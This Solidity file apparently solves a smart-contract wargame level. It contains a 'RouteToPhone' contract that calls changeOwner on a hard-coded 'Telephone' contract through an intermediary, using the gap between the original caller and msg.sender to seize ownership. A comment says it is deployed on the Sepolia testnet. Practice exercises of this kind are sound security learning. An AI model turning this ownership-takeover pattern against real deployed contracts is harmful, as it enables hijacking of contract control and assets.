// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    function changeOwner(address _owner) public {}
}

/**
 * @title RouteToPhone
 * @author Richu A Kuttikattu
 * @notice The contract calls Telephone with its msg.sender, but msg.sender for Telephone would be this contract
 * @dev Contract deployed at 0x6d8Adaea3Ec3F6d7d7D1af86A37e07C83E365fA0 in Sepolia
 */
contract RouteToPhone {
    Telephone phone = Telephone(0x1a721D33f3665cbAAC7938816631CbEfD1288257);

    function callPhone() public {
        phone.changeOwner(msg.sender);
    }
}
